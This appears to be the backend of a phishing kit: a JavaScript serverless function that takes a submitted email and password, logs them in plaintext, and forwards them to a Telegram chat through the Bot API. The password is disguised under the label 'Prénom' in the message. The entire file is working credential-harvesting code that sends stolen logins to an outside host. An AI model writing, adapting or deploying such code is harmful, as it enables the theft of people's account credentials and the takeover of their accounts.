export async function handler(event) {
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      body: "Method Not Allowed",
    };
  }

  try {
    const { email, password } = JSON.parse(event.body);
    console.log("Données reçues:", { email, password });  // Log les données reçues

    if (!email || !password) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: "Champs manquants" }),
      };
    }

    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    const message =
`📩 Nouveau formulaire
👤 Nom : ${email}
👤 Prénom : ${password}`;

    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
        }),
      }
    );
    const data = await response.json();
    console.log("Réponse de Telegram:", data);  // Affiche la réponse de Telegram

    if (!response.ok) {
      throw new Error("Erreur Telegram");
    }

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true }),
    };

  } catch (err) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: err.message }),
    };
  }
}



